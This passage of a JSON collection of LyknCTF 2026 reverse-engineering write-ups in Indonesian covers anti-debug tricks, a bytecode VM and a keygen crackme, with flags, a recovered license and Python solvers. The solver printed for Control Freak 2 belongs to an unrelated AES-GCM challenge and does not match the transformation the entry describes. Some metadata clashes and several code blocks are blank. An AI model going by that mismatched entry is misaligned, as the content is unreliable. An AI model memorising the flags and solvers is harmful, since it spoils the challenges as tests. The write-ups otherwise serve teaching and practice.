    "flag": "LYKNCTF{H0W_D1D_Y0U_C0NTR0L_TH4T}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-controlfreak2",
    "title": "Control Freak 2",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Reverse  \n**Difficulty:** Medium  \n**Flag:** `LYKNCTF{1S_1T_H4RD_T0_C0NTR0L}`",
    "problemDescription": "> The checker looks simple: give it a flag, get Correct or Nope. But the control flow does not like being watched, and every wrong move quietly changes the truth. Can you take back control?\n\nBinary tersedia dalam build Linux dan Windows. Analisis memakai `chall-3`, yaitu ELF x86-64 PIE yang sudah stripped.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Output penting:\n\n\n\nProgram menerima flag lewat argumen pertama atau stdin. Panjang input yang benar adalah 30 byte.",
        "code": "file chall-3\nstrings -a -n 4 chall-3\nobjdump -d -M intel chall-3 > chall-3.asm\nobjdump -s -j .rodata chall-3"
      },
      {
        "title": "Control-flow Flattening",
        "content": "Fungsi utama mulai di `0x1200`. Alur program dikendalikan oleh state di `[rsp+0x24]`.\n\n| State | Fungsi |\n|---|---|\n| `0x91cf3a2b` | timing check dan anti-debug |\n| `0xd2387a55` | menghitung panjang input |\n| `0x0f6d3c2a` | membangun S-box dan mentransformasi input |\n| `0x58a91e43` | memuat target 30 byte |\n| `0xaf314621` | membandingkan hasil transformasi |\n| `0x3d12f0b7` | mencetak `Correct!` atau `Nope` |\n\nPerpindahan state dibungkus opaque predicate seperti:\n\n\n\nNilainya selalu nol karena hasil kali dua bilangan berurutan selalu genap. Cabang mutasi di `0x1c00` tidak pernah dipakai pada jalur normal.",
        "code": "(x * x + x) & 1"
      },
      {
        "title": "Anti-debug",
        "content": "State awal membentuk nilai `poison` yang dicampurkan ke seed transformasi. Nilainya berubah saat program mendeteksi pengawasan.\n\nCheck yang dipakai:\n\n- timing loop `0x40000` iterasi;\n- membaca `/proc/self/status`;\n- mencari `TracerPid:`;\n- `ptrace(PTRACE_TRACEME, ...)`;\n- environment variable `LD_PRELOAD`;\n- environment variable `LD_AUDIT`.\n\nString tersembunyi didecode memakai XOR dengan key byte yang bertambah `0x1d`:\n\n\n\nSaat dijalankan normal, `poison = 0`. Debugging biasa mengubah seed sehingga flag benar tetap menghasilkan `Nope`.",
        "code": "TracerPid:\nLD_PRELOAD\nLD_AUDIT"
      },
      {
        "title": "S-box Deterministik",
        "content": "Program membuat array `0..255`, lalu mengacaknya memakai Fisher-Yates dan mixer SplitMix64."
      },
      {
        "title": "Konstanta:",
        "content": "",
        "code": "GOLDEN = 0x9E3779B97F4A7C15\nMIX_C1 = 0xBF58476D1CE4E5B9\nMIX_C2 = 0x94D049BB133111EB"
      },
      {
        "title": "Mixer:",
        "content": "Karena semua konstanta tetap, permutation 256 byte bisa dibuat ulang persis.",
        "code": "def splitmix64(x):\n    x ^= x >> 30\n    x *= 0xBF58476D1CE4E5B9\n    x ^= x >> 27\n    x *= 0x94D049BB133111EB\n    x ^= x >> 31\n    return x & 0xffffffffffffffff"
      },
      {
        "title": "Seed:",
        "content": "Pada jalur normal:\n\n\n\nTransformasi setiap byte:\n\n\n\nAccumulator awal bernilai `0xa5`.",
        "code": "state = poison * 0x100000001B3\nstate ^= 0xD1B54A32D192ED03"
      },
      {
        "title": "Target",
        "content": "Target efektif sepanjang 30 byte:\n\n\n\nCompare dilakukan dalam urutan:\n\n\n\nUrutannya diacak, tetapi seluruh byte tetap diperiksa.",
        "code": "ea437aa1769548cea7f376079e82c8aa450a4d078422147a7e36a159f412"
      },
      {
        "title": "Membalik Transformasi",
        "content": "S-box adalah permutation, jadi inverse S-box dapat dibuat."
      },
      {
        "title": "Dari:",
        "content": "didapat:\n\n\n\nLalu operasi sisanya dibalik:\n\n\n\nTidak ada brute force. Setiap byte flag diperoleh langsung dari target.",
        "code": "output[i] = previous ^ sbox[index]"
      },
      {
        "title": "Solver",
        "content": "Validasi ke binary Linux:",
        "code": "python3 solve.py"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "<FLAG>LYKNCTF{1S_1T_H4RD_T0_C0NTR0L}</FLAG>\nflag: Correct!"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport hashlib\r\nimport hmac\r\nimport json\r\nimport multiprocessing as mp\r\nimport os\r\nimport socket\r\nimport sys\r\nfrom typing import Iterable\r\n\r\nfrom Crypto.Cipher import AES\r\n\r\nKDF_INFO = b\"lyknctf-2026\"\r\nDENSITY = 0.36\r\nFLAG_PREFIXES = (b\"LYKN{\", b\"LYKNCTF{\")\r\nG = {}\r\n\r\n\r\ndef extract_json(data: bytes):\r\n    \"\"\"Return (object, end_offset) for the first complete JSON object in data.\"\"\"\r\n    text = data.decode(errors=\"ignore\")\r\n    starts = [i for i, ch in enumerate(text) if ch == \"{\"]\r\n    for start in starts:\r\n        depth = 0\r\n        in_string = False\r\n        escaped = False\r\n        for i in range(start, len(text)):\r\n            ch = text[i]\r\n            if in_string:\r\n                if escaped:\r\n                    escaped = False\r\n                elif ch == \"\\\\\":\r\n                    escaped = True\r\n                elif ch == '\"':\r\n                    in_string = False\r\n                continue\r\n            if ch == '\"':\r\n                in_string = True\r\n            elif ch == \"{\":\r\n                depth += 1\r\n            elif ch == \"}\":\r\n                depth -= 1\r\n                if depth == 0:\r\n                    candidate = text[start : i + 1]\r\n                    try:\r\n                        return json.loads(candidate), i + 1\r\n                    except json.JSONDecodeError:\r\n                        break\r\n    return None, None\r\n\r\n\r\ndef sign_counts(target_even: int, target_odd: int, N: int):\r\n    \"\"\"Exact +/- coefficient counts produced by constrained_ternary().\"\"\"\r\n    used = abs(target_even) + abs(target_odd)\r\n    target_total = int(DENSITY * N)\r\n    pad_needed = max(target_total - used, 0)\r\n    pairs_per_parity = pad_needed // 4 + 1\r\n\r\n    positive = max(target_even, 0) + max(target_odd, 0) + 2 * pairs_per_parity\r\n    negative = max(-target_even, 0) + max(-target_odd, 0) + 2 * pairs_per_parity\r\n    return positive, negative\r\n\r\n\r\ndef residue_intervals(lo: int, hi: int, modulus: int):\r\n    \"\"\"Convert every integer in [lo, hi] into compact residue intervals mod modulus.\"\"\"\r\n    if hi - lo + 1 >= modulus:\r\n        return [(0, modulus)]\r\n\r\n    pieces = []\r\n    first_k = lo // modulus\r\n    last_k = hi // modulus\r\n    for k in range(first_k, last_k + 1):\r\n        left = max(lo, k * modulus)\r\n        right = min(hi, (k + 1) * modulus - 1)\r\n        if left <= right:\r\n            pieces.append((left - k * modulus, right - k * modulus + 1))\r\n\r\n    merged = []\r\n    for left, right in sorted(pieces):\r\n        if merged and left <= merged[-1][1]:\r\n            merged[-1] = (merged[-1][0], max(merged[-1][1], right))\r\n        else:\r\n            merged.append((left, right))\r\n    return merged\r\n\r\n\r\ndef candidate_intervals(instance: dict):\r\n    params = instance[\"parameters\"]\r\n    leak = instance[\"leakage\"]\r\n    N = int(params[\"N\"])\r\n    q_prime = int(params[\"q_prime\"])\r\n\r\n    fp, fn = sign_counts(int(leak[\"f_even_sum\"]), int(leak[\"f_odd_sum\"]), N)\r\n    gp, gn = sign_counts(int(leak[\"g_even_sum\"]), int(leak[\"g_odd_sum\"]), N)\r\n\r\n    positive_products = fp * gp + fn * gn\r\n    negative_products = fp * gn + fn * gp\r\n\r\n    # Every pair f_i*g_j contributes once to weighted_trace with weight 1..N.\r\n    lo = positive_products - N * negative_products\r\n    hi = N * positive_products - negative_products\r\n    return residue_intervals(lo, hi, q_prime), (lo, hi)\r\n\r\n\r\ndef init_worker(instance: dict):\r\n    params = instance[\"parameters\"]\r\n    enc = instance[\"encrypted_flag\"]\r\n    N = int(params[\"N\"])\r\n    q = int(params[\"q\"])\r\n    q_prime = int(params[\"q_prime\"])\r\n\r\n    G.clear()\r\n    G.update(\r\n        salt=str(N).encode(),\r\n        info=KDF_INFO,\r\n        ikm_suffix=(\r\n            N.to_bytes(2, \"big\")\r\n            + q.to_bytes(2, \"big\")\r\n            + q_prime.to_bytes(4, \"big\")\r\n        ),\r\n        nonce=bytes.fromhex(enc[\"nonce\"]),\r\n        ciphertext=bytes.fromhex(enc[\"ciphertext\"]),\r\n        tag=bytes.fromhex(enc[\"tag\"]),\r\n    )\r\n\r\n\r\ndef derive_key(s_alg: int):\r\n    ikm = s_alg.to_bytes(4, \"big\") + G[\"ikm_suffix\"]\r\n    prk = hmac.digest(G[\"salt\"], ikm, \"sha256\")\r\n    return hmac.digest(prk, G[\"info\"] + b\"\\x01\", \"sha256\")\r\n\r\n\r\ndef test_chunk(bounds):\r\n    start, stop = bounds\r\n    nonce = G[\"nonce\"]\r\n    ciphertext = G[\"ciphertext\"]\r\n    tag = G[\"tag\"]\r\n    head_len = min(8, len(ciphertext))\r\n\r\n    for s_alg in range(start, stop):\r\n        key = derive_key(s_alg)\r\n\r\n        # Prefix test avoids the expensive GHASH/tag check for almost all keys.\r\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\r\n        head = cipher.decrypt(ciphertext[:head_len])\r\n        if not head.startswith(FLAG_PREFIXES):\r\n            continue\r\n\r\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\r\n        try:\r\n            plaintext = cipher.decrypt_and_verify(ciphertext, tag)\r\n        except ValueError:\r\n            continue\r\n        return s_alg, plaintext\r\n    return None\r\n\r\n\r\ndef make_chunks(intervals: Iterable[tuple[int, int]], chunk_size: int):\r\n    for start, stop in intervals:\r\n        for left in range(start, stop, chunk_size):\r\n            yield left, min(left + chunk_size, stop)\r\n\r\n\r\ndef solve_instance(instance: dict, workers: int, chunk_size: int = 2048):\r\n    intervals, raw_bound = candidate_intervals(instance)\r\n    total = sum(stop - start for start, stop in intervals)\r\n    print(f\"[*] weighted integer bound: {raw_bound[0]} .. {raw_bound[1]}\", file=sys.stderr)\r\n    print(f\"[*] candidate residues: {total} / {instance['parameters']['q_prime']}\", file=sys.stderr)\r\n    print(f\"[*] workers: {workers}\", file=sys.stderr)\r\n\r\n    chunks = list(make_chunks(intervals, chunk_size))\r\n    ctx = mp.get_context(\"fork\")\r\n    with ctx.Pool(workers, initializer=init_worker, initargs=(instance,)) as pool:\r\n        for result in pool.imap_unordered(test_chunk, chunks, chunksize=1):\r\n            if result is not None:\r\n                pool.terminate()\r\n                pool.join()\r\n                return result\r\n    raise RuntimeError(\"no valid AES-GCM key found\")\r\n\r\n\r\ndef load_instance_from_file(path: str):\r\n    with open(path, \"rb\") as handle:\r\n        data = handle.read()\r\n    obj, _ = extract_json(data)\r\n    if obj is None:\r\n        raise ValueError(f\"no JSON object found in {path}\")\r\n    return obj\r\n\r\n\r\ndef receive_instance(sock: socket.socket):\r\n    data = bytearray()\r\n    while True:\r\n        chunk = sock.recv(65536)\r\n        if not chunk:\r\n            raise EOFError(\"remote closed before sending a complete JSON instance\")\r\n        data.extend(chunk)\r\n        sys.stderr.buffer.write(chunk)\r\n        sys.stderr.buffer.flush()\r\n        obj, _ = extract_json(bytes(data))\r\n        if obj is not None:\r\n            return obj\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Sleepless Machine solver\")\r\n    parser.add_argument(\"target\", nargs=\"?\", help=\"instance JSON file, or remote host\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, help=\"remote port\")\r\n    parser.add_argument(\r\n        \"-j\",\r\n        \"--workers\",\r\n        type=int,\r\n        default=min(16, os.cpu_count() or 1),\r\n        help=\"number of brute-force workers (default: min(16, CPU count))\",\r\n    )\r\n    parser.add_argument(\"--chunk-size\", type=int, default=2048)\r\n    args = parser.parse_args()\r\n\r\n    if not args.target:\r\n        raw = sys.stdin.buffer.read()\r\n        instance, _ = extract_json(raw)\r\n        if instance is None:\r\n            parser.error(\"provide HOST PORT, an instance JSON file, or JSON on stdin\")\r\n        remote = None\r\n    elif args.port is None:\r\n        instance = load_instance_from_file(args.target)\r\n        remote = None\r\n    else:\r\n        remote = socket.create_connection((args.target, args.port))\r\n        instance = receive_instance(remote)\r\n\r\n    s_alg, plaintext = solve_instance(instance, max(1, args.workers), args.chunk_size)\r\n    flag = plaintext.decode()\r\n    print(f\"[+] s_alg = {s_alg}\")\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n    if remote is not None:\r\n        remote.sendall(plaintext + b\"\\n\")\r\n        remote.settimeout(2.0)\r\n        try:\r\n            while True:\r\n                chunk = remote.recv(65536)\r\n                if not chunk:\r\n                    break\r\n                sys.stdout.buffer.write(chunk)\r\n                sys.stdout.buffer.flush()\r\n        except (socket.timeout, TimeoutError):\r\n            pass\r\n        finally:\r\n            remote.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{1S_1T_H4RD_T0_C0NTR0L}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-controlfreak3",
    "title": "Control Freak 3",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Reverse\n- **Difficulty:** Hard\n- **Files:** `chall-4`, `chall-4.exe`\n- **Flag:** `LYKNCTF{0UT_0F_C0NTR0L_VM2026}`",
    "problemDescription": "Binary Linux memakai beberapa lapis anti-debug lalu menjalankan virtual machine kecil. Flag tidak dibandingkan sebagai string biasa. Lima blok bytecode terenkripsi didekripsi saat runtime, kemudian VM memeriksa panjang input, karakter tunggal, pasangan karakter, tiga karakter, dan hash keseluruhan.\n\nSolver membaca struktur VM langsung dari `chall-4`, mendekripsi seluruh blok, mengambil constraint karakter, lalu menyelesaikannya tanpa brute force flag penuh.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil penting:\n\n\n\nImport Linux menunjukkan beberapa pemeriksaan anti-debug:\n\n\n\nProgram menerima flag melalui argumen pertama atau `stdin`, lalu menampilkan `Correct!` atau `Nope`.",
        "code": "file chall-4 chall-4.exe\nstrings -a -n 4 chall-4\nreadelf -S chall-4\nobjdump -d -M intel chall-4 > elf.asm"
      },
      {
        "title": "Anti-debug",
        "content": "Sebelum validator berjalan, binary mengecek beberapa kondisi:\n\n- durasi loop dengan `clock_gettime`;\n- `TracerPid` dari `/proc/self/status`;\n- environment variable debugger;\n- nama debugger pada `/proc/self/maps`;\n- `ptrace(PTRACE_TRACEME)`;\n- handler sinyal.\n\nSemua hasil pemeriksaan digabungkan ke state internal. State bersih harus bernilai nol agar hasil validasi bisa diterima.\n\nTitik setelah rangkaian anti-debug berada di sekitar `0x401655`. Dari sana, program menyiapkan VM key tetap:",
        "code": "0x8f4d2c6b1a097835"
      },
      {
        "title": "Struktur bytecode",
        "content": "Tabel descriptor VM berada di `0x403420`. Ada lima record, masing-masing berukuran `0x20` byte:\n\n\n\nBlob terenkripsi dimulai di `0x403060`.\n\nSetiap byte didekripsi memakai state 64-bit, rotasi, dan finalizer SplitMix64:\n\n\n\nVM key berubah setelah satu blok selesai, jadi blok berikutnya tidak bisa didekripsi memakai key awal yang sama.",
        "code": "+0x00  uint16 offset blob\n+0x02  uint16 panjang blok\n+0x08  uint64 key A\n+0x10  uint64 key B\n+0x18  uint64 chain target"
      },
      {
        "title": "Opcode VM",
        "content": "Opcode asli diacak lewat tabel dispatch di `0x4034c0`. Setelah dipetakan, handler yang relevan adalah:\n\n| Opcode | Fungsi |\n|---|---|\n| 0 | akhiri blok terakhir dan cek hasil |\n| 1 | akhiri blok lalu lanjut ke blok berikutnya |\n| 2 | constraint panjang input |\n| 3 | constraint satu karakter |\n| 4 | constraint dua karakter |\n| 5 | constraint tiga karakter |\n| 6 | hash keseluruhan input |\n| 7 | update state internal |\n\nConstraint satu karakter langsung menghasilkan indeks berikut:\n\n\n\nConstraint dua karakter saling terhubung. Setelah karakter awal diketahui, pasangan berurutan seperti `(7,8)`, `(8,9)`, `(9,10)`, dan seterusnya membuat seluruh flag bisa dipulihkan satu per satu.\n\nHasil akhirnya:",
        "code": "0 = L\n1 = Y\n2 = K\n3 = N\n4 = C\n5 = T\n6 = F\n7 = {\n29 = }"
      },
      {
        "title": "Solver",
        "content": "Solver hanya memakai Python standard library.",
        "code": "python3 solve.py ./chall-4"
      },
      {
        "title": "Output:",
        "content": "`solve.py` melakukan langkah berikut:\n\n1. membaca descriptor dan blob terenkripsi dari ELF;\n2. mendekripsi lima blok bytecode secara berantai;\n3. memetakan opcode memakai dispatch table;\n4. mengumpulkan constraint satu dan dua karakter;\n5. menyelesaikan semua kandidat byte sampai setiap posisi unik;\n6. menjalankan binary asli untuk memastikan output `Correct!`.",
        "code": "[+] Flag: LYKNCTF{0UT_0F_C0NTR0L_VM2026}\n[+] Checker: Correct!"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport os\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nMASK64 = 0xFFFFFFFFFFFFFFFF\r\nIMAGE_BASE = 0x400000\r\nGOLDEN = 0x9E3779B97F4A7C15\r\nSPLITMIX_A = 0xBF58476D1CE4E5B9\r\nSPLITMIX_B = 0x94D049BB133111EB\r\nBASE_KEY = 0xD6E8FEB86659FD93\r\nINITIAL_VM_KEY = 0x8F4D2C6B1A097835\r\n\r\n\r\ndef u32(value: int) -> int:\r\n    return value & MASK32\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    count &= 31\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rol64(value: int, count: int) -> int:\r\n    value &= MASK64\r\n    count &= 63\r\n    return ((value << count) | (value >> (64 - count))) & MASK64\r\n\r\n\r\ndef read_u16(data: bytes, address: int) -> int:\r\n    return struct.unpack_from(\"<H\", data, address - IMAGE_BASE)[0]\r\n\r\n\r\ndef read_u64(data: bytes, address: int) -> int:\r\n    return struct.unpack_from(\"<Q\", data, address - IMAGE_BASE)[0]\r\n\r\n\r\ndef decrypt_blocks(data: bytes) -> list[bytes]:\r\n    blob = data[0x3060:0x3060 + 0x3B2]\r\n    blocks: list[bytes] = []\r\n\r\n    vm_key = INITIAL_VM_KEY\r\n    rolling_golden = GOLDEN\r\n    rolling_base = BASE_KEY\r\n\r\n    for block_index in range(5):\r\n        record = 0x403420 + block_index * 0x20\r\n        offset = read_u16(data, record)\r\n        length = read_u16(data, record + 2)\r\n        key_a = read_u64(data, record + 8)\r\n        key_b = read_u64(data, record + 16)\r\n        chain_target = read_u64(data, record + 24)\r\n\r\n        state = rol64(\r\n            rolling_base + vm_key + key_b,\r\n            11 * block_index + 1,\r\n        ) ^ key_a\r\n\r\n        plaintext = bytearray()\r\n        for index in range(length):\r\n            state = (state + GOLDEN + index) & MASK64\r\n\r\n            mixed = state\r\n            mixed = ((mixed ^ (mixed >> 30)) * SPLITMIX_A) & MASK64\r\n            mixed = ((mixed ^ (mixed >> 27)) * SPLITMIX_B) & MASK64\r\n            mixed ^= mixed >> 31\r\n\r\n            shift = (index & 7) * 8\r\n            mask_byte = (\r\n                (vm_key >> shift)\r\n                + 17 * block_index\r\n                + 29 * index\r\n            ) & 0xFF\r\n\r\n            decoded = mask_byte ^ blob[offset + index] ^ ((mixed >> shift) & 0xFF)\r\n            plaintext.append(decoded)\r\n\r\n        blocks.append(bytes(plaintext))\r\n\r\n        vm_key = rol64(\r\n            vm_key ^ rolling_golden ^ chain_target,\r\n            7 * block_index + 21,\r\n        )\r\n        rolling_golden = (rolling_golden + GOLDEN) & MASK64\r\n        rolling_base = (rolling_base + BASE_KEY) & MASK64\r\n\r\n    return blocks\r\n\r\n\r\ndef opcode(raw: int, dispatch_table: bytes) -> int:\r\n    return (((37 * raw + 0x5A) & 0xFF) ^ dispatch_table[raw])\r\n\r\n\r\ndef parse_constraints(blocks: list[bytes], dispatch_table: bytes):\r\n    one_constraints: list[tuple[int, int, int]] = []\r\n    two_constraints: list[tuple[int, int, int, int]] = []\r\n    maximum_index = -1\r\n\r\n    for block in blocks:\r\n        ip = 0\r\n        while ip < len(block):\r\n            op = opcode(block[ip], dispatch_table)\r\n\r\n            if op in (0, 1):\r\n                break\r\n            if op == 2:\r\n                ip += 9\r\n            elif op == 3:\r\n                index = block[ip + 1]\r\n                immediate, expected = struct.unpack_from(\"<II\", block, ip + 2)\r\n                one_constraints.append((index, immediate, expected))\r\n                maximum_index = max(maximum_index, index)\r\n                ip += 10\r\n            elif op == 4:\r\n                index_a = block[ip + 1]\r\n                index_b = block[ip + 2]\r\n                immediate, expected = struct.unpack_from(\"<II\", block, ip + 3)\r\n                two_constraints.append((index_a, index_b, immediate, expected))\r\n                maximum_index = max(maximum_index, index_a, index_b)\r\n                ip += 11\r\n            elif op == 5:\r\n                maximum_index = max(maximum_index, *block[ip + 1:ip + 4])\r\n                ip += 12\r\n            elif op == 6:\r\n                ip += 13\r\n            elif op == 7:\r\n                ip += 5\r\n            else:\r\n                raise ValueError(f\"Invalid VM opcode {op} at offset {ip:#x}\")\r\n\r\n    return one_constraints, two_constraints, maximum_index + 1\r\n\r\n\r\ndef check_one(index: int, immediate: int, expected: int, char: int) -> int:\r\n    edx = index\r\n    r11 = u32(expected + 0x9E3779B9)\r\n    r8 = u32(index + expected)\r\n\r\n    edx = u32((edx << 8) | char)\r\n    edx ^= r11\r\n    r11 = u32(char << ((index & 3) + 1))\r\n    edx = u32(edx * 0x045D9F3B)\r\n\r\n    rotate_a = ((expected >> 27) & 0xF) + 5\r\n    rotate_b = ((expected ^ char) & 7) + 3\r\n\r\n    edx = u32(edx + r11)\r\n    edx = rol32(edx, rotate_a)\r\n    edx ^= edx >> 11\r\n    edx = u32(edx * 0x27D4EB2D)\r\n\r\n    r8 = u32(r8 + char * 0x165667B1)\r\n    result = rol32(r8, rotate_b) ^ immediate ^ edx\r\n    return u32(result)\r\n\r\n\r\ndef check_two(\r\n    index_a: int,\r\n    index_b: int,\r\n    immediate: int,\r\n    expected: int,\r\n    char_a: int,\r\n    char_b: int,\r\n) -> int:\r\n    r11 = u32(index_a * 0x9E3779B1)\r\n    r11 ^= u32(index_b * 0x85EBCA77)\r\n    r11 ^= expected\r\n\r\n    r11 = u32((char_a + 0x101) * (expected | 1) + r11)\r\n    r11 ^= u32(char_b * 0xC2B2AE3D - 0x6576DEB3)\r\n\r\n    selector = u32(index_a * 2) ^ u32(expected ^ index_b)\r\n    r11 = rol32(r11, (selector & 0xF) + 5)\r\n\r\n    mixed = u32((char_a ^ char_b) * 0x27D4EB2D)\r\n    mixed = u32(r11 + mixed - 0x10952609)\r\n\r\n    second = u32((char_b << 8) + index_b * 0x1D + index_a * 17 + char_a)\r\n    second = u32(second * 0x165667B1)\r\n    second = rol32(second, ((expected >> 5) & 0xF) + 3)\r\n    second ^= mixed\r\n\r\n    result = u32(char_a * char_b + 0x9E37)\r\n    result = u32(result * ((expected >> 16) | 1) + second)\r\n    result ^= result >> 13\r\n    result = u32(result * 0x85EBCA6B)\r\n\r\n    return u32(immediate ^ result ^ (result >> 16))\r\n\r\n\r\ndef solve(binary_path: Path) -> str:\r\n    data = binary_path.read_bytes()\r\n    dispatch_table = data[0x34C0:0x35C0]\r\n    blocks = decrypt_blocks(data)\r\n    one_constraints, two_constraints, flag_length = parse_constraints(\r\n        blocks,\r\n        dispatch_table,\r\n    )\r\n\r\n    possibilities: dict[int, set[int]] = {}\r\n\r\n    for index, immediate, expected in one_constraints:\r\n        solutions = {\r\n            value\r\n            for value in range(256)\r\n            if check_one(index, immediate, expected, value) == 0\r\n        }\r\n        possibilities[index] = possibilities.get(index, set(range(256))) & solutions\r\n\r\n    changed = True\r\n    while changed:\r\n        changed = False\r\n        for index_a, index_b, immediate, expected in two_constraints:\r\n            values_a = possibilities.get(index_a, set(range(256)))\r\n            values_b = possibilities.get(index_b, set(range(256)))\r\n\r\n            if len(values_a) == 256 and len(values_b) == 256:\r\n                continue\r\n\r\n            valid_pairs = {\r\n                (value_a, value_b)\r\n                for value_a in values_a\r\n                for value_b in values_b\r\n                if check_two(\r\n                    index_a,\r\n                    index_b,\r\n                    immediate,\r\n                    expected,\r\n                    value_a,\r\n                    value_b,\r\n                ) == 0\r\n            }\r\n\r\n            next_a = {value_a for value_a, _ in valid_pairs}\r\n            next_b = {value_b for _, value_b in valid_pairs}\r\n\r\n            if possibilities.get(index_a) != next_a:\r\n                possibilities[index_a] = next_a\r\n                changed = True\r\n            if possibilities.get(index_b) != next_b:\r\n                possibilities[index_b] = next_b\r\n                changed = True\r\n\r\n    result = bytearray()\r\n    for index in range(flag_length):\r\n        printable = sorted(\r\n            value\r\n            for value in possibilities.get(index, set())\r\n            if 0x20 <= value <= 0x7E\r\n        )\r\n        if len(printable) != 1:\r\n            raise RuntimeError(\r\n                f\"Character {index} is not uniquely solved: {printable}\"\r\n            )\r\n        result.append(printable[0])\r\n\r\n    return result.decode(\"ascii\")\r\n\r\n\r\ndef main() -> int:\r\n    binary_path = Path(sys.argv[1] if len(sys.argv) > 1 else \"chall-4\")\r\n    if not binary_path.is_file():\r\n        print(f\"[-] Binary not found: {binary_path}\", file=sys.stderr)\r\n        return 1\r\n\r\n    flag = solve(binary_path)\r\n    print(f\"[+] Flag: {flag}\")\r\n\r\n    if os.access(binary_path, os.X_OK):\r\n        completed = subprocess.run(\r\n            [str(binary_path.resolve()), flag],\r\n            text=True,\r\n            capture_output=True,\r\n            check=False,\r\n        )\r\n        output = (completed.stdout + completed.stderr).strip()\r\n        print(f\"[+] Checker: {output}\")\r\n        if \"Correct!\" not in output:\r\n            return 1\r\n\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{0UT_0F_C0NTR0L_VM2026}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-crack1",
    "title": "Cr4ck 1 — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Reverse\n- **Binary:** `KeygenMe.exe`\n- **Architecture:** PE32+ x86-64\n- **Difficulty:** Medium\n- **Flag:** `LYKNCTF{k3yg3n_h3ll_s3lfh4sh_4ntidbg_h1dd3n_us3r_2026}`",
    "problemDescription": "Binary meminta username dan license key lewat GUI. Username yang valid tidak disimpan sebagai string biasa, license dihitung dari username dan status anti-debug, sedangkan flag dienkripsi memakai hash dari `.text`, kredensial valid, dan byte anti-debug.\n\nHasil akhirnya:\n\n```text\nUsername : th3_LYKN_v3nd0r\nLicense  : 7211-57C4-CD96-CC26-5B67\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Identifikasi awal:\n\n\n\nOutput penting:\n\n\n\nImport yang relevan:\n\n- `GetDlgItemTextA` untuk mengambil username dan license.\n- `lstrcmpA` untuk membandingkan hasil keygen.\n- `NtQueryInformationProcess` untuk pemeriksaan debugger.\n- `MessageBoxA` untuk menampilkan hasil.",
        "code": "file KeygenMe.exe\nstrings -a -n 4 KeygenMe.exe | grep -Ei 'license|username|flag|success|failed'"
      },
      {
        "title": "Username tersembunyi",
        "content": "Fungsi di sekitar `0x1400014d0` menginisialisasi array `S[256]` lalu menjalankan RC4 Key Scheduling Algorithm dengan key:\n\n\n\nFungsi di `0x140001f10` mengambil beberapa byte dari tabel RC4 tersebut dan meng-XOR-nya dengan konstanta di `.rdata`:\n\n\n\nDelapan byte pertama dibentuk dari indeks:\n\n\n\nTujuh byte berikutnya memakai indeks mulai `0x47` dengan kenaikan lima. Hasil transformasinya:\n\n\n\nBinary membandingkan string ini dengan input username memakai `lstrcmpA`.",
        "code": "L0i_Y3u_Kh0_N0i"
      },
      {
        "title": "Anti-debug mask",
        "content": "Binary membentuk satu byte mask dari empat pemeriksaan:\n\n1. `PEB.BeingDebugged` memberi bit `0x01`.\n2. `PEB.NtGlobalFlag & 0x70` memberi bit `0x02`.\n3. `ProcessDebugPort` memberi bit `0x04`.\n4. `ProcessDebugFlags == 0` memberi bit `0x08`.\n\nPada eksekusi normal tanpa debugger, mask bernilai `0`.\n\nMask ini tidak cuma memblokir debugging. Nilainya masuk ke algoritma license dan derivasi kunci flag, jadi patch jump sederhana bisa menghasilkan license valid tetapi dekripsi flag tetap gagal."
      },
      {
        "title": "Algoritma license",
        "content": "Fungsi `0x140001660` menerima username dan anti-debug mask. State awalnya:\n\n\n\nUsername diproses tiga kali dengan offset `0`, `7`, dan `14`. Setiap byte mengambil nilai dari tabel RC4 lalu dicampur memakai penjumlahan 32-bit, XOR, dan rotasi `ROL 3/5/11/17`.\n\nSetelah empat finalization rounds, state diubah menjadi lima nilai 16-bit dan diformat sebagai lima grup hexadecimal uppercase:\n\n\n\nInput license terlebih dahulu diubah ke uppercase, jadi format lowercase juga akan dinormalisasi oleh binary.",
        "code": "r8  = 0x4c594b4e ^ (mask * 0x01010101)\nr9  = 0xae054fb9\nr11 = 0x43544632\nacc = 0xa5a5f00d"
      },
      {
        "title": "Solver",
        "content": "Solver hanya memakai Python standard library. Ia mem-parsing section table PE, membangun tabel RC4, memulihkan username, membuat license, menghitung self-hash, lalu mendekripsi flag.",
